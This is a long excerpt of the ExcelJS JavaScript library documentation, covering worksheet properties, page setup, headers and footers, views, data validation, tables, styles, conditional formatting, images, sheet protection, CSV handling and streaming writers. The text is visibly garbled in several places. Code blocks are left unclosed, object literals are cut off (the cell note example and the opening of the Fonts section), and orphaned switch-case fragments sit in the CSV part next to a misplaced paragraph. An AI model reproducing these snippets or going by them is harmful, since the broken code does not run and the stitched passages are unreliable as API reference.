// adjust properties afterwards (not supported by worksheet-writer)
worksheet.properties.outlineLevelCol = 2;
worksheet.properties.defaultRowHeight = 15;
```

**Supported Properties**

| Name             | Default    | Description |
| ---------------- | ---------- | ----------- |
| tabColor         | undefined  | Color of the tabs |
| outlineLevelCol  | 0          | The worksheet column outline level |
| outlineLevelRow  | 0          | The worksheet row outline level |
| defaultRowHeight | 15         | Default row height |
| defaultColWidth  | (optional) | Default column width |
| dyDescent        | 55         | TBD |

### Worksheet Metrics[⬆](#contents)<!-- Link generated with jump2header -->

Some new metrics have been added to Worksheet...

| Name              | Description |
| ----------------- | ----------- |
| rowCount          | The total row size of the document. Equal to the row number of the last row that has values. |
| actualRowCount    | A count of the number of rows that have values. If a mid-document row is empty, it will not be included in the count. |
| columnCount       | The total column size of the document. Equal to the maximum cell count from all of the rows |
| actualColumnCount | A count of the number of columns that have values. |


## Page Setup[⬆](#contents)<!-- Link generated with jump2header -->

All properties that can affect the printing of a sheet are held in a pageSetup object on the sheet.

```javascript
// create new sheet with pageSetup settings for A4 - landscape
const worksheet =  workbook.addWorksheet('sheet', {
  pageSetup:{paperSize: 9, orientation:'landscape'}
});

// create a new sheet writer with pageSetup settings for fit-to-page
const worksheetWriter = workbookWriter.addWorksheet('sheet', {
  pageSetup:{fitToPage: true, fitToHeight: 5, fitToWidth: 7}
});

// adjust pageSetup settings afterwards
worksheet.pageSetup.margins = {
  left: 0.7, right: 0.7,
  top: 0.75, bottom: 0.75,
  header: 0.3, footer: 0.3
};

// Set Print Area for a sheet
worksheet.pageSetup.printArea = 'A1:G20';

// Set multiple Print Areas by separating print areas with '&&'
worksheet.pageSetup.printArea = 'A1:G10&&A11:G20';

// Repeat specific rows on every printed page
worksheet.pageSetup.printTitlesRow = '1:3';

## Headers and Footers[⬆](#contents)<!-- Link generated with jump2header -->

Here's how to add headers and footers.
The added content is mainly text, such as time, introduction, file information, etc., and you can set the style of the text.
In addition, you can set different texts for the first page and even page.

Note: Images are not currently supported.

```javascript

// Create worksheets with headers and footers
var sheet = workbook.addWorksheet('sheet', {
  headerFooter:{firstHeader: ""Hello Exceljs"", firstFooter: ""Hello World""}
});
// Create worksheets with headers and footers
var worksheetWriter = workbookWriter.addWorksheet('sheet', {
  headerFooter:{firstHeader: ""Hello Exceljs"", firstFooter: ""Hello World""}
});
// Set footer (default centered), result: ""Page 2 of 16""
worksheet.headerFooter.oddFooter = ""Page &P of &N"";

// Set the footer (default centered) to bold, resulting in: ""Page 2 of 16""
worksheet.headerFooter.oddFooter = ""Page &P of &N"";

// Set the left footer to 18px and italicize. Result: ""Page 2 of 16""
worksheet.headerFooter.oddFooter = ""&LPage &P of &N"";

// Set the middle header to gray Aril, the result: ""52 exceljs""
worksheet.headerFooter.oddHeader = ""&C&KCCCCCC&\""Aril\""52 exceljs"";

// Set the left, center, and right text of the footer. Result: “Exceljs” in the footer left. “demo.xlsx” in the footer center. “Page 2” in the footer right
worksheet.headerFooter.oddFooter = ""&Lexceljs&C&F&RPage &P"";

// Add different header & footer for the first page
worksheet.headerFooter.differentFirst = true;
worksheet.headerFooter.firstHeader = ""Hello Exceljs"";
worksheet.headerFooter.firstFooter = ""Hello World""
```

**Supported headerFooter settings**

| Name              | Default   | Description |
| ----------------- | --------- | ----------- |
| differentFirst    | false     | Set the value of differentFirst as true, which indicates that headers/footers for first page are different from the other pages |
| differentOddEven  | false     | Set the value of differentOddEven as true, which indicates that headers/footers for odd and even pages are different |
| oddHeader         | null      | Set header string for odd(default) pages, could format the string |
| oddFooter         | null      | Set footer string for odd(default) pages, could format the string |
| evenHeader        | null      | Set header string for even pages, could format the string |
| evenFooter        | null      | Set footer string for even pages, could format the string |
| firstHeader       | null      | Set header string for the first page, could format the string |

## Worksheet Views[⬆](#contents)<!-- Link generated with jump2header -->

Worksheets now support a list of views, that control how Excel presents the sheet:

* frozen - where a number of rows and columns to the top and left are frozen in place. Only the bottom right section will scroll
* split - where the view is split into 4 sections, each semi-independently scrollable.

Each view also supports various properties:

| Name              | Default   | Description |
| ----------------- | --------- | ----------- |
| state             | 'normal'  | Controls the view state - one of normal, frozen or split |
| rightToLeft       | false     | Sets the worksheet view's orientation to right-to-left |
| activeCell        | undefined | The currently selected cell |
| showRuler         | true      | Shows or hides the ruler in Page Layout |
| showRowColHeaders | true      | Shows or hides the row and column headers (e.g. A1, B1 at the top and 1,2,3 on the left |
| showGridLines     | true      | Shows or hides the gridlines (shown for cells where borders have not been defined) |
| zoomScale         | 100       | Percentage zoom to use for the view |
| zoomScaleNormal   | 100       | Normal zoom for the view |
| style             | undefined | Presentation style - one of pageBreakPreview or pageLayout. Note pageLayout is not compatible with frozen views |

### Frozen Views[⬆](#contents)<!-- Link generated with jump2header -->

Frozen views support the following extra properties:

| Name              | Default   | Description |
| ----------------- | --------- | ----------- |
| xSplit            | 0         | How many columns to freeze. To freeze rows only, set this to 0 or undefined |
| ySplit            | 0         | How many rows to freeze. To freeze columns only, set this to 0 or undefined |
| topLeftCell       | special   | Which cell will be top-left in the bottom-right pane. Note: cannot be a frozen cell. Defaults to first unfrozen cell |

```javascript
worksheet.views = [
  {state: 'frozen', xSplit: 2, ySplit: 3, topLeftCell: 'G10', activeCell: 'A1'}
];
```

### Split Views[⬆](#contents)<!-- Link generated with jump2header -->

Split views support the following extra properties:

| Name              | Default   | Description |
| ----------------- | --------- | ----------- |
| xSplit            | 0         | How many points from the left to place the splitter. To split vertically, set this to 0 or undefined |
| ySplit            | 0         | How many points from the top to place the splitter. To split horizontally, set this to 0 or undefined  |
| topLeftCell       | undefined | Which cell will be top-left in the bottom-right pane. |
| activePane        | undefined | Which pane will be active - one of topLeft, topRight, bottomLeft and bottomRight |

```javascript
worksheet.views = [
  {state: 'split', xSplit: 2000, ySplit: 3000, topLeftCell: 'G10', activeCell: 'A1'}
];
```

## Auto filters[⬆](#contents)<!-- Link generated with jump2header -->

It is possible to apply an auto filter to your worksheet.

```javascript
worksheet.autoFilter = 'A1:C1';
```

While the range string is the standard form of the autoFilter, the worksheet will also support the
following values:

```javascript
// Set an auto filter from A1 to C1
worksheet.autoFilter = {
  from: 'A1',
  to: 'C1',
}

// Set an auto filter from the cell in row 3 and column 1
// to the cell in row 5 and column 12
worksheet.autoFilter = {
  from: {
    row: 3,
    column: 1
  },
  to: {
    row: 5,
    column: 12
  }
}

// Set an auto filter from D3 to the
// cell in row 7 and column 5
worksheet.autoFilter = {
  from: 'D3',
  to: {
    row: 7,
    column: 5
  }
}
```

## Columns[⬆](#contents)<!-- Link generated with jump2header -->

```javascript
// Add column headers and define column keys and widths
// Note: these column structures are a workbook-building convenience only,
// apart from the column width, they will not be fully persisted.
worksheet.columns = [

  { header: 'Name', key: 'name', width: 32 },
  { header: 'D.O.B.', key: 'DOB', width: 10, outlineLevel: 1 }
];

// Access an individual columns by key, letter and 1-based column number
const idCol = worksheet.getColumn('id');
const nameCol = worksheet.getColumn('B');
const dobCol = worksheet.getColumn(3);

// Note: will overwrite cell value C1
dobCol.header = 'Date of Birth';

// Note: this will overwrite cell values C1:C2
dobCol.header = ['Date of Birth', 'A.K.A. D.O.B.'];

// from this point on, this column will be indexed by 'dob' and not 'DOB'
dobCol.key = 'dob';

dobCol.width = 15;

// Hide the column if you'd like
dobCol.hidden = true;

// set an outline level for columns
worksheet.getColumn(4).outlineLevel = 0;

// If column properties have been defined, they will be cut or moved accordingly
// Known Issue: If a splice causes any merged cells to move, the results may be unpredictable
worksheet.spliceColumns(3,2);

// remove one column and insert two more.
// Note: columns 4 and above will be shifted right by 1 column.
// Also: If the worksheet has more rows than values in the column inserts,
//  the rows will still be shifted as if the values existed
const newCol3Values = [1,2,3,4,5];
const newCol4Values = ['one', 'two', 'three', 'four', 'five'];
worksheet.spliceColumns(3, 1, newCol3Values, newCol4Values);

ws.getCell('A1').value = 'One';
ws.getCell('A2').value = 'Two';
ws.getCell('A3').value = 'Three';
ws.getCell('A4').value = 'Four';

## Defined Names[⬆](#contents)<!-- Link generated with jump2header -->

Individual cells (or multiple groups of cells) can have names assigned to them.
 The names can be used in formulas and data validation (and probably more).

```javascript
// assign (or get) a name for a cell (will overwrite any other names that cell had)
worksheet.getCell('A1').name = 'PI';
expect(worksheet.getCell('A1').name).to.equal('PI');

// assign (or get) an array of names for a cell (cells can have more than one name)
worksheet.getCell('A1').names = ['thing1', 'thing2'];
expect(worksheet.getCell('A1').names).to.have.members(['thing1', 'thing2']);

// remove a name from a cell
worksheet.getCell('A1').removeName('thing1');
expect(worksheet.getCell('A1').names).to.have.members(['thing2']);
```

## Data Validations[⬆](#contents)<!-- Link generated with jump2header -->

Cells can define what values are valid or not and provide prompting to the user to help guide them.

Validation types can be one of the following:

| Type       | Description |
| ---------- | ----------- |
| list       | Define a discrete set of valid values. Excel will offer these in a dropdown for easy entry |
| whole      | The value must be a whole number |
| decimal    | The value must be a decimal number |
| textLength | The value may be text but the length is controlled |
| custom     | A custom formula controls the valid values |

For types other than list or custom, the following operators affect the validation:

| Operator              | Description |
| --------------------  | ----------- |
| between               | Values must lie between formula results |
| notBetween            | Values must not lie between formula results |
| equal                 | Value must equal formula result |
| notEqual              | Value must not equal formula result |
| greaterThan           | Value must be greater than formula result |
| lessThan              | Value must be less than formula result |
| greaterThanOrEqual    | Value must be greater than or equal to formula result |
| lessThanOrEqual       | Value must be less than or equal to formula result |

```javascript
// Specify list of valid values (One, Two, Three, Four).
// Excel will provide a dropdown with these values.
worksheet.getCell('A1').dataValidation = {
  type: 'list',
  allowBlank: true,
  formulae: ['""One,Two,Three,Four""']
};

// Specify list of valid values from a range.
// Excel will provide a dropdown with these values.
worksheet.getCell('A1').dataValidation = {
  type: 'list',
  allowBlank: true,
  formulae: ['$D$5:$F$5']
};

// Specify Cell must be a whole number that is not 5.
// Show the user an appropriate error message if they get it wrong
worksheet.getCell('A1').dataValidation = {
  type: 'whole',
  operator: 'notEqual',
  showErrorMessage: true,
  formulae: [5],
  errorStyle: 'error',
  errorTitle: 'Five',
  error: 'The value must not be Five'
};

// Specify Cell must be a decimal number between 1.5 and 7.
// Add 'tooltip' to help guid the user
worksheet.getCell('A1').dataValidation = {
  type: 'decimal',
  operator: 'between',
  allowBlank: true,
  showInputMessage: true,
  formulae: [1.5, 7],
  promptTitle: 'Decimal',
  prompt: 'The value must between 1.5 and 7'
};

// Specify Cell must be have a text length less than 15
worksheet.getCell('A1').dataValidation = {
  type: 'textLength',
  operator: 'lessThan',
  showErrorMessage: true,
  allowBlank: true,
  formulae: [15]
};

// Specify Cell must be have be a date before 1st Jan 2016
worksheet.getCell('A1').dataValidation = {
  type: 'date',
  operator: 'lessThan',
  showErrorMessage: true,
  allowBlank: true,
  formulae: [new Date(2016,0,1)]
};
```

## Cell Comments[⬆](#contents)<!-- Link generated with jump2header -->

Add old style comment to a cell

```javascript
// plain text note
worksheet.getCell('A1').note = 'Hello, ExcelJS!';

// colourful formatted note
ws.getCell('B1').note = {

ws.getCell('B1').note.editAs = 'twoCells';
```

| Value     | Description |
| --------- | ----------- |
| twoCells | It specifies that the size and position of the note varies with cells |
| oneCells   | It specifies that the size of the note is fixed and the position changes with the cell |
| absolute  | This is the default. Comments will not be moved or sized with cells |

## Tables[⬆](#contents)<!-- Link generated with jump2header -->

Tables allow for in-sheet manipulation of tabular data.

To add a table to a worksheet, define a table model and call addTable:

```javascript
// add a table to a sheet
ws.addTable({
  name: 'MyTable',
  ref: 'A1',
  headerRow: true,
  totalsRow: true,
  style: {
    theme: 'TableStyleDark3',
    showRowStripes: true,
  },
  columns: [
    {name: 'Date', totalsRowLabel: 'Totals:', filterButton: true},
    {name: 'Amount', totalsRowFunction: 'sum', filterButton: false},
  ],
  rows: [
    [new Date('2019-07-20'), 70.10],
    [new Date('2019-07-21'), 70.60],
    [new Date('2019-07-22'), 70.10],
  ],
});
```

Note: Adding a table to a worksheet will modify the sheet by placing
headers and row data to the sheet.
Any data on the sheet covered by the resulting table (including headers and
totals) will be overwritten.

### Totals Functions[⬆](#contents)<!-- Link generated with jump2header -->

The following table list the valid values for the totalsRowFunction property
defined by columns. If any value other than 'custom' is used, it is not
necessary to include the associated formula as this will be inserted
by the table.

| Totals Functions   | Description       |

### Table Style Themes[⬆](#contents)<!-- Link generated with jump2header -->

Valid theme names follow the following pattern:

* ""TableStyle[Shade][Number]""

Shades, Numbers can be one of:

* Light, 1-21
* Medium, 1-28
* Dark, 1-11

For no theme, use the value null.

Note: custom table themes are not supported by exceljs yet.

### Modifying Tables[⬆](#contents)<!-- Link generated with jump2header -->

Tables support a set of manipulation functions that allow data to be
added or removed and some properties to be changed. Since many of these
operations may have on-sheet effects, the changes must be committed
once complete.

All index values in the table are zero based, so the first row number
and first column number is 0.

**Adding or Removing Headers and Totals**

```javascript
const table = ws.getTable('MyTable');

// turn header row on
table.headerRow = true;

// turn totals row off
table.totalsRow = false;

// commit the table changes into the sheet
table.commit();
```

**Relocating a Table**

```javascript
const table = ws.getTable('MyTable');

// table top-left move to D4
table.ref = 'D4';

// commit the table changes into the sheet
table.commit();
```

**Adding and Removing Rows**

```javascript
const table = ws.getTable('MyTable');

// remove first two rows
table.removeRows(0, 2);

// insert new rows at index 5
table.addRow([new Date('2019-08-05'), 5, 'Mid'], 5);

// append new row to bottom of table
table.addRow([new Date('2019-08-10'), 10, 'End']);

// commit the table changes into the sheet
table.commit();
```

**Adding and Removing Columns**

```javascript
const table = ws.getTable('MyTable');

// remove second column
table.removeColumns(1, 1);

// insert new column (with data) at index 1
table.addColumn(
  {name: 'Letter', totalsRowFunction: 'custom', totalsRowFormula: 'ROW()', totalsRowResult: 6, filterButton: true},
  ['a', 'b', 'c', 'd'],
  2
);

// commit the table changes into the sheet
table.commit();
```

**Change Column Properties**

```javascript
const table = ws.getTable('MyTable');

// Get Column Wrapper for second column
const column = table.getColumn(1);

// set some properties
column.name = 'Code';
column.filterButton = true;
column.style = {font:{bold: true, name: 'Comic Sans MS'}};
column.totalsRowLabel = 'Totals';
column.totalsRowFunction = 'custom';
column.totalsRowFormula = 'ROW()';
column.totalsRowResult = 10;

// commit the table changes into the sheet
table.commit();
```


## Styles[⬆](#contents)<!-- Link generated with jump2header -->

Cells, Rows and Columns each support a rich set of styles and formats that affect how the cells are displayed.

Styles are set by assigning the following properties:

* <a href=""#number-formats"">numFmt</a>
* <a href=""#fonts"">font</a>
* <a href=""#alignment"">alignment</a>
* <a href=""#borders"">border</a>
* <a href=""#fills"">fill</a>

```javascript
// assign a style to a cell
ws.getCell('A1').numFmt = '0.00%';

// Apply styles to worksheet columns
ws.columns = [
  { header: 'Id', key: 'id', width: 10 },
  { header: 'Name', key: 'name', width: 32, style: { font: { name: 'Arial Black' } } },
  { header: 'D.O.B.', key: 'DOB', width: 10, style: { numFmt: 'dd/mm/yyyy' } }
];

// Set Column 3 to Currency Format
ws.getColumn(3).numFmt = '""£""#,##0.00;[Red]\-""£""#,##0.00';

// Set Row 2 to Comic Sans.
ws.getRow(2).font = { name: 'Comic Sans MS', family: 4, size: 16, underline: 'double', bold: true };
```

When a style is applied to a row or column, it will be applied to all currently existing cells in that row or column.
 Also, any new cell that is created will inherit its initial styles from the row and column it belongs to.

If a cell's row and column both define a specific style (e.g. font), the cell will use the row style over the column style.
 However if the row and column define different styles (e.g. column.numFmt and row.font), the cell will inherit the font from the row and the numFmt from the column.

Caveat: All the above properties (with the exception of numFmt, which is a string), are JS object structures.
 If the same style object is assigned to more than one spreadsheet entity, then each entity will share the same style object.
 If the style object is later modified before the spreadsheet is serialized, then all entities referencing that style object will be modified too.
 This behaviour is intended to prioritize performance by reducing the number of JS objects created.
 If you want the style objects to be independent, you will need to clone them before assigning them.
 Also, by default, when a document is read from file (or stream) if spreadsheet entities share similar styles, then they will reference the same style object too.

### Number Formats[⬆](#contents)<!-- Link generated with jump2header -->

```javascript
// display value as '1 3/5'
ws.getCell('A1').value = 1.6;
ws.getCell('A1').numFmt = '# ?/?';

// display value as '1.60%'
ws.getCell('B1').value = 0.016;
ws.getCell('B1').numFmt = '0.00%';
```

### Fonts[⬆](#contents)<!-- Link generated with jump2header -->

};

// for the graduate graphic designers...
ws.getCell('A2').font = {
  name: 'Arial Black',
  color: { argb: 'FF00FF00' },
  family: 2,
  size: 14,
  italic: true
};

// for the vertical align
ws.getCell('A3').font = {
  vertAlign: 'superscript'
};

// note: the cell will store a reference to the font object assigned.
// If the font object is changed afterwards, the cell font will change also...
const font = { name: 'Arial', size: 12 };
ws.getCell('A3').font = font;
font.size = 20; // Cell A3 now has font size 20!

// Cells that share similar fonts may reference the same font object after
// the workbook is read from file or stream
```

#### Pattern Fills[⬆](#contents)<!-- Link generated with jump2header -->

| Property | Required | Description |
| -------- | -------- | ----------- |
| type     | Y        | Value: 'pattern'<br/>Specifies this fill uses patterns |
| pattern  | Y        | Specifies type of pattern (see <a href=""#valid-pattern-types"">Valid Pattern Types</a> below) |
| fgColor  | N        | Specifies the pattern foreground color. Default is black. |
| bgColor  | N        | Specifies the pattern background color. Default is white. |

Note: If you want to fill a cell using the `solid` pattern, then you don't need to specify `bgColor`.
See example above for cell `A3` with a `solid` pattern and a coral `fgColor`.


**Valid Pattern Types**

* none
* solid
* darkGray
* mediumGray
* lightGray
* gray125
* gray0625
* darkHorizontal
* darkVertical
* darkDown
* darkUp
* darkGrid
* darkTrellis
* lightHorizontal
* lightVertical
* lightDown
* lightUp
* lightGrid
* lightTrellis

#### Gradient Fills[⬆](#contents)<!-- Link generated with jump2header -->

| Property | Required | Description |
| -------- | -------- | ----------- |
| type     | Y        | Value: 'gradient'<br/>Specifies this fill uses gradients |
| gradient | Y        | Specifies gradient type. One of ['angle', 'path'] |
| degree   | angle    | For 'angle' gradient, specifies the direction of the gradient. 0 is from the left to the right. Values from 1 - 359 rotates the direction clockwise |
| center   | path     | For 'path' gradient. Specifies the relative coordinates for the start of the path. 'left' and 'top' values range from 0 to 1 |
| stops    | Y        | Specifies the gradient colour sequence. Is an array of objects containing position and color starting with position 0 and ending with position 1. Intermediary positions may be used to specify other colours on the path. |

**Caveats**

Using the interface above it may be possible to create gradient fill effects not possible using the XLSX editor program.
For example, Excel only supports angle gradients of 0, 45, 90 and 135.
Similarly the sequence of stops may also be limited by the UI with positions [0,1] or [0,0.5,1] as the only options.
Take care with this fill to be sure it is supported by the target XLSX viewers.

### Rich Text[⬆](#contents)<!-- Link generated with jump2header -->

Individual cells now support rich text or in-cell formatting.
 Rich text values can control the font properties of any number of sub-strings within the text value.
 See <a href=""font"">Fonts</a> for a complete list of details on what font properties are supported.

```javascript

ws.getCell('A1').value = {
  'richText': [
    {'font': {'size': 12,'color': {'theme': 0},'name': 'Calibri','family': 2,'scheme': 'minor'},'text': 'This is '},
    {'font': {'italic': true,'size': 12,'color': {'theme': 0},'name': 'Calibri','scheme': 'minor'},'text': 'a'},
    {'font': {'size': 12,'color': {'theme': 1},'name': 'Calibri','family': 2,'scheme': 'minor'},'text': ' '},
    {'font': {'size': 12,'color': {'argb': 'FFFF6600'},'name': 'Calibri','scheme': 'minor'},'text': 'colorful'},
    {'font': {'size': 12,'color': {'theme': 1},'name': 'Calibri','family': 2,'scheme': 'minor'},'text': ' text '},
    {'font': {'size': 12,'color': {'argb': 'FFCCFFCC'},'name': 'Calibri','scheme': 'minor'},'text': 'with'},
    {'font': {'size': 12,'color': {'theme': 1},'name': 'Calibri','family': 2,'scheme': 'minor'},'text': ' in-cell '},
    {'font': {'bold': true,'size': 12,'color': {'theme': 1},'name': 'Calibri','family': 2,'scheme': 'minor'},'text': 'format'}
  ]
};

expect(ws.getCell('A1').text).to.equal('This is a colorful text with in-cell format');
expect(ws.getCell('A1').type).to.equal(Excel.ValueType.RichText);

```

### Cell Protection[⬆](#contents)<!-- Link generated with jump2header -->

Cell level protection can be modified using the protection property.

```javascript
ws.getCell('A1').protection = {
  locked: false,
  hidden: true,
};
```

**Supported Protection Properties**

| Property | Default | Description |
| -------- | ------- | ----------- |
| locked   | true    | Specifies whether a cell will be locked if the sheet is protected. |
| hidden   | false   | Specifies whether a cell's formula will be visible if the sheet is protected. |

## Conditional Formatting[⬆](#contents)<!-- Link generated with jump2header -->

Conditional formatting allows a sheet to show specific styles, icons, etc
depending on cell values or any arbitrary formula.

Conditional formatting rules are added at the sheet level and will typically
cover a range of cells.

Multiple rules can be applied to a given cell range and each rule will apply
its own style.

If multiple rules affect a given cell, the rule priority value will determine
which rule wins out if competing styles collide.
The rule with the lower priority value wins.
If priority values are not specified for a given rule, ExcelJS will assign them
in ascending order.

Note: at present, only a subset of conditional formatting rules are supported.
Specifically, only the formatting rules that do not require XML rendering
inside an &lt;extLst&gt; element. This means that datasets and three specific
icon sets (3Triangles, 3Stars, 5Boxes) are not supported.

```javascript
// add a checkerboard pattern to A1:E7 based on row + col being even or odd
worksheet.addConditionalFormatting({
  ref: 'A1:E7',
  rules: [
    {
      type: 'expression',
      formulae: ['MOD(ROW()+COLUMN(),2)=0'],
      style: {fill: {type: 'pattern', pattern: 'solid', bgColor: {argb: 'FF00FF00'}}},
    }
  ]
})
```

**Supported Conditional Formatting Rule Types**

| Type         | Description |
| ------------ | ----------- |
| expression   | Any custom function may be used to activate the rule. |
| cellIs       | Compares cell value with supplied formula using specified operator |
| top10        | Applies formatting to cells with values in top (or bottom) ranges |
| aboveAverage | Applies formatting to cells with values above (or below) average |
| colorScale   | Applies a coloured background to cells based on where their values lie in the range |
| iconSet      | Adds one of a range of icons to cells based on value |
| containsText | Applies formatting based on whether cell a specific text |

## Outline Levels[⬆](#contents)<!-- Link generated with jump2header -->

Excel supports outlining; where rows or columns can be expanded or collapsed depending on what level of detail the user wishes to view.

Outline levels can be defined in column setup:
```javascript
worksheet.columns = [
  { header: 'Id', key: 'id', width: 10 },
  { header: 'Name', key: 'name', width: 32 },
  { header: 'D.O.B.', key: 'DOB', width: 10, outlineLevel: 1 }
];
```

Or directly on the row or column
```javascript
worksheet.getColumn(3).outlineLevel = 1;
worksheet.getRow(3).outlineLevel = 1;
```

The sheet outline levels can be set on the worksheet
```javascript
// set column outline level
worksheet.properties.outlineLevelCol = 1;

// set row outline level
worksheet.properties.outlineLevelRow = 1;
```

Note: adjusting outline levels on rows or columns or the outline levels on the worksheet will incur a side effect of also modifying the collapsed property of all rows or columns affected by the property change. E.g.:
```javascript
worksheet.properties.outlineLevelCol = 1;

worksheet.getColumn(3).outlineLevel = 1;
expect(worksheet.getColumn(3).collapsed).to.be.true;

worksheet.properties.outlineLevelCol = 2;
expect(worksheet.getColumn(3).collapsed).to.be.false;
```

The outline properties can be set on the worksheet

```javascript
worksheet.properties.outlineProperties = {
  summaryBelow: false,
  summaryRight: false,
};
```

## Images[⬆](#contents)<!-- Link generated with jump2header -->

Adding images to a worksheet is a two-step process.
First, the image is added to the workbook via the addImage() function which will also return an imageId value.
Then, using the imageId, the image can be added to the worksheet either as a tiled background or covering a cell range.

Note: As of this version, adjusting or transforming the image is not supported and images are not supported in streaming mode.

### Add Image to Workbook[⬆](#contents)<!-- Link generated with jump2header -->

The Workbook.addImage function supports adding images by filename or by Buffer.
Note that in both cases, the extension must be specified.
Valid extension values include 'jpeg', 'png', 'gif'.

```javascript
// add image to workbook by filename
const imageId1 = workbook.addImage({
  filename: 'path/to/image.jpg',
  extension: 'jpeg',
});

// add image to workbook by buffer
const imageId2 = workbook.addImage({
  buffer: fs.readFileSync('path/to.image.png'),
  extension: 'png',
});

// add image to workbook by base64
const myBase64Image = ""data:image/png;base64,iVBORw0KG..."";
const imageId2 = workbook.addImage({
  base64: myBase64Image,
  extension: 'png',
});
```

### Add image background to worksheet[⬆](#contents)<!-- Link generated with jump2header -->

Using the image id from Workbook.addImage, the background to a worksheet can be set using the addBackgroundImage function

```javascript
// set background
worksheet.addBackgroundImage(imageId1);
```

### Add image over a range[⬆](#contents)<!-- Link generated with jump2header -->

Using the image id from Workbook.addImage, an image can be embedded within the worksheet to cover a range.
The coordinates calculated from the range will cover from the top-left of the first cell to the bottom right of the second.

```javascript
// insert an image over B2:D6
worksheet.addImage(imageId2, 'B2:D6');
```

Using a structure instead of a range string, it is possible to partially cover cells.

Note that the coordinate system used for this is zero based, so the top-left of A1 will be { col: 0, row: 0 }.
Fractions of cells can be specified by using floating point numbers, e.g. the midpoint of A1 is { col: 0.5, row: 0.5 }.

```javascript
// insert an image over part of B2:D6
worksheet.addImage(imageId2, {
  tl: { col: 1.5, row: 1.5 },
  br: { col: 3.5, row: 5.5 }
});
```

The cell range can also have the property 'editAs' which will control how the image is anchored to the cell(s)
It can have one of the following values:

| Value     | Description |
| --------- | ----------- |
| undefined | It specifies the image will be moved and sized with cells |
| oneCell   | This is the default. Image will be moved with cells but not sized |
| absolute  | Image will not be moved or sized with cells |

```javascript
ws.addImage(imageId, {
  tl: { col: 0.1125, row: 0.4 },
  br: { col: 2.101046875, row: 3.4 },
  editAs: 'oneCell'
});
```

### Add image to a cell[⬆](#contents)<!-- Link generated with jump2header -->

You can add an image to a cell and then define its width and height in pixels at 96dpi.

```javascript
worksheet.addImage(imageId2, {
  tl: { col: 0, row: 0 },
  ext: { width: 500, height: 200 }
});
```

### Add image with hyperlinks[⬆](#contents)<!-- Link generated with jump2header -->

You can add an image with hyperlinks to a cell, and defines the hyperlinks in image range.

```javascript
worksheet.addImage(imageId2, {
  tl: { col: 0, row: 0 },
  ext: { width: 500, height: 200 },
  hyperlinks: {
    hyperlink: 'http://www.somewhere.com',
    tooltip: 'http://www.somewhere.com'
  }
});
```

## Sheet Protection[⬆](#contents)<!-- Link generated with jump2header -->

Worksheets can be protected from modification by adding a password.

```javascript
await worksheet.protect('the-password', options);
```

Worksheet protection can also be removed:

```javascript
worksheet.unprotect();
```


See <a href=""#cell-protection"">Cell Protection</a> for details on how
to modify individual cell protection.

**Note:** While the protect() function returns a Promise indicating
that it is async, the current implementation runs on the main
thread and will use approx 600ms on an average CPU. This can be adjusted
by setting the spinCount, which can be used to make the process either
faster or more resilient.

The CSV parser uses [fast-csv](https://www.npmjs.com/package/fast-csv) to read the CSV file.
The formatterOptions in the options passed to the above write function will be passed to the @fast-csv/format module to write csv data.
 Please refer to the fast-csv README.md for details.

Dates are parsed using the npm module [dayjs](https://www.npmjs.com/package/dayjs).
 If a dateFormats array is not supplied, the following dateFormats are used:

* 'YYYY-MM-DD\[T\]HH:mm:ss'
* 'MM-DD-YYYY'
* 'YYYY-MM-DD'

Please refer to the [dayjs CustomParseFormat plugin](https://github.com/iamkun/dayjs/blob/HEAD/docs/en/Plugin.md#customparseformat) for details on how to structure a dateFormat.

      case 0:
        // column 1 is string
        return value;
      case 1:
        // column 2 is a date
        return dayjs(value).format('YYYY-MM-DD');
      case 2:
        // column 3 is a formula, write just the result
        return value.result;

    delimiter: '\t',
    quote: false,
  },
};
await workbook.csv.writeFile(filename, options);

// write to a new buffer
const buffer = await workbook.csv.writeBuffer();
```

The CSV parser uses [fast-csv](https://www.npmjs.com/package/fast-csv) to write the CSV file.
 The formatterOptions in the options passed to the above write function will be passed to the @fast-csv/format module to write csv data.
 Please refer to the fast-csv README.md for details.

Dates are formatted using the npm module [dayjs](https://www.npmjs.com/package/dayjs).
 If no dateFormat is supplied, dayjs.ISO_8601 is used.
 When writing a CSV you can supply the boolean dateUTC as true to have ExcelJS parse the date without automatically
 converting the timezone using `dayjs.utc()`.

### Streaming I/O[⬆](#contents)<!-- Link generated with jump2header -->

The File I/O documented above requires that an entire workbook is built up in memory before the file can be written.
 While convenient, it can limit the size of the document due to the amount of memory required.

A streaming writer (or reader) processes the workbook or worksheet data as it is generated,
 converting it into file form as it goes. Typically this is much more efficient on memory as the final
 memory footprint and even intermediate memory footprints are much more compact than with the document version,
 especially when you consider that the row and cell objects are disposed once they are committed.

The interface to the streaming workbook and worksheet is almost the same as the document versions with a few minor practical differences:

* Once a worksheet is added to a workbook, it cannot be removed.
* Once a row is committed, it is no longer accessible since it will have been dropped from the worksheet.
* unMergeCells() is not supported.

Note that it is possible to build the entire workbook without committing any rows.
 When the workbook is committed, all added worksheets (including all uncommitted rows) will be automatically committed.
 However in this case, little will have been gained over the Document version.

#### Streaming XLSX[⬆](#contents)<!-- Link generated with jump2header -->

##### Streaming XLSX Writer(#contents)<!-- Link generated with jump2header -->

The streaming XLSX workbook writer is available in the ExcelJS.stream.xlsx namespace.

The constructor takes an optional options object with the following fields:

| Field            | Description |
| ---------------- | ----------- |
| stream           | Specifies a writable stream to write the XLSX workbook to. |
| filename         | If stream not specified, this field specifies the path to a file to write the XLSX workbook to. |
| useSharedStrings | Specifies whether to use shared strings in the workbook. Default is `false`. |
| useStyles        | Specifies whether to add style information to the workbook. Styles can add some performance overhead. Default is `false`. |
| zip              | [Zip options](https://www.archiverjs.com/global.html#ZipOptions) that ExcelJS internally passes to [Archiver](https://github.com/archiverjs/node-archiver). Default is `undefined`. |

If neither stream nor filename is specified in the options, the workbook writer will create a StreamBuf object
 that will store the contents of the XLSX workbook in memory.
 This StreamBuf object, which can be accessed via the property workbook.stream, can be used to either
 access the bytes directly by stream.read() or to pipe the contents to another stream.

```javascript
// construct a streaming XLSX workbook writer with styles and shared strings
const options = {
  filename: './streamed-workbook.xlsx',
  useStyles: true,
  useSharedStrings: true
};
const workbook = new Excel.stream.xlsx.WorkbookWriter(options);
```

In general, the interface to the streaming XLSX writer is the same as the Document workbook (and worksheets)
 described above, in fact the row, cell and style objects are the same.

However there are some differences...

**Construction**

As seen above, the WorkbookWriter will typically require the output stream or file to be specified in the constructor.

**Committing Data**

When a worksheet row is ready, it should be committed so that the row object and contents can be freed.
 Typically this would be done as each row is added...

```javascript
worksheet.addRow({
   id: i,
   name: theName,
   etc: someOtherDetail
}).commit();
```

